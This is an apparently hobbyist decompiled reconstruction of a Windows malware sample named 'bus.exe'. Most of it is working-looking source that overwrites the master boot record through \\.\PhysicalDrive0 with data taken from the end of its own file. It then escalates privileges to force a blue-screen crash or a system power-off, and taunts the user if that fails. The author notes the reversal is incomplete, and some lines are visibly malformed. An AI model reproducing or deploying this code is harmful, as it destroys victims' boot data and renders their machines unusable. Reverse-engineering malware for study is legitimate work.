//bus.exe
//reversed by citraX
//youtube.com/watch?v=ftvo5IMdecU
//i dont know what is origin language(maybe C++)
//WARNING! THIS IS NOT FULL REVERSE CODE. MAYBE IT DOESNT WORKING. NOTE THAT.

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HMODULE ModuleHandleA; // eax
  HANDLE FileA; // esi
  DWORD FileSize; // eax
  DWORD NumberOfBytesRead; // [esp+8h] [ebp-114h] BYREF
  unsigned __int8 Buffer; // [esp+Fh] [ebp-10Dh] BYREF
  CHAR Filename[264]; // [esp+10h] [ebp-10Ch] BYREF

  sub_401000(); //function1
  Sleep(0x3E8u);// = Sleep(1000);
  ModuleHandleA = GetModuleHandleA(0);
  GetModuleFileNameA(ModuleHandleA, Filename, 0x104u);
  FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  FileSize = GetFileSize(FileA, 0);
  SetFilePointer(FileA, FileSize - 1, 0, 0);
  ReadFile(FileA, &Buffer, 1u, &NumberOfBytesRead, 0);
  CloseHandle(FileA);
  if ( Buffer == 3 )
    return sub_401213();//function2
  else
    return sub_401112(Buffer);//method3
}

BOOL sub_401000()
{
  HMODULE ModuleHandleA; // eax
  HANDLE FileA; // esi
  DWORD FileSize; // eax
  HANDLE FileW; // esi
  DWORD NumberOfBytesRead; // [esp+8h] [ebp-1110h] BYREF
  char Buffer[4096]; // [esp+Ch] [ebp-110Ch] BYREF
  CHAR Filename[264]; // [esp+100Ch] [ebp-10Ch] BYREF

  ModuleHandleA = GetModuleHandleA(0);
  GetModuleFileNameA(ModuleHandleA, Filename, 0x104u);
  FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  FileSize = GetFileSize(FileA, 0);
  SetFilePointer(FileA, FileSize - 4097, 0, 0);
  ReadFile(FileA, Buffer, 0x1000u, &NumberOfBytesRead, 0);
  CloseHandle(FileA);
  FileW = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
  if ( FileW == (HANDLE)-1 )
  {
    MessageBoxW(0, L"Failed 1", L"Error", 0x10u);
    ExitProcess(1u);
  }
  if ( !WriteFile(FileW, Buffer, 0x1000u, &NumberOfBytesRead, 0) )
  {
    MessageBoxW(0, L"Failed 2", L"Error", 0x10u);
    ExitProcess(2u);
  }
  return CloseHandle(FileW);
}

BOOL sub_401213()
{
  HMODULE LibraryW; // ebx
  HMODULE v1; // eax
  FARPROC NtRaiseHardError; // edi
  int v3; // esi
  BOOL result; // eax
  FARPROC RtlAdjustPrivilege; // [esp+Ch] [ebp-10h]
  int v6; // [esp+10h] [ebp-Ch] BYREF
  char v7; // [esp+17h] [ebp-5h] BYREF

  LibraryW = LoadLibraryW(L"ntdll.dll");
  RtlAdjustPrivilege = GetProcAddress(LibraryW, "RtlAdjustPrivilege");
  v1 = LoadLibraryW(L"ntdll.dll");
  NtRaiseHardError = GetProcAddress(v1, "NtRaiseHardError");
  v6 = 0;
  result = (!RtlAdjustPrivilege
         || (v3 = ((int (__stdcall *)(int, int, _DWORD, char *))RtlAdjustPrivilege)(19, 1, 0, &v7),
             FreeLibrary(LibraryW),
             !v3))
        && ((int (__stdcall *)(int, _DWORD, _DWORD, _DWORD, int, int *))NtRaiseHardError)(-1073741818, 0, 0, 0, 6, &v6);
  return result;
}

nt __thiscall sub_401112(void *this)
{
  FARPROC NtSetSystemPowerState; // eax
  int v3; // esi
  int v5; // esi
  int v6; // esi
  UINT v7; // eax
  HMODULE LibraryW; // [esp+Ch] [ebp-20h]
  FARPROC NtShutdownSystem; // [esp+10h] [ebp-1Ch]
  HMODULE v10; // [esp+14h] [ebp-18h]
  int (__stdcall *v11)(); // [esp+18h] [ebp-14h]
  HMODULE hLibModule; // [esp+1Ch] [ebp-10h]
  FARPROC RtlAdjustPrivilege; // [esp+20h] [ebp-Ch]
  char v14; // [esp+27h] [ebp-5h] BYREF

  hLibModule = LoadLibraryW(L"ntdll.dll");
  RtlAdjustPrivilege = GetProcAddress(hLibModule, "RtlAdjustPrivilege");
  LibraryW = LoadLibraryW(L"ntdll.dll");
  NtShutdownSystem = GetProcAddress(LibraryW, "NtShutdownSystem");
  v10 = LoadLibraryW(L"ntdll.dll");
  NtSetSystemPowerState = GetProcAddress(v10, "NtSetSystemPowerState");
  v11 = NtSetSystemPowerState;
  if ( RtlAdjustPrivilege )
  {
    v3 = ((int (__stdcall *)(int, int, _DWORD, char *))RtlAdjustPrivilege)(19, 1, 0, &v14);
    FreeLibrary(hLibModule);
    if ( v3 )
      return 0;
    NtSetSystemPowerState = v11;
  }
  if ( !NtSetSystemPowerState
    || (v5 = ((int (__stdcall *)(int, int, int))NtSetSystemPowerState)(6, 6, 65546), FreeLibrary(v10), v5) )
  {
    if ( !NtShutdownSystem || (v6 = ((int (__stdcall *)(void *))NtShutdownSystem)(this), FreeLibrary(LibraryW), v6) )
    {
      v7 = 8;
      if ( this != (void *)2 )
        v7 = 0;
      if ( this == (void *)1 )
        v7 = 2;
      if ( !ExitWindowsEx(v7, 4u) )
      {
        MessageBoxW(0, L"I can't power off the computer.\nYou're lucky this time...", L"Error - NT", 0x10u); //wait wait its monoxide function?!?!
        return 0;
      }
    }
  }
  return 1;
}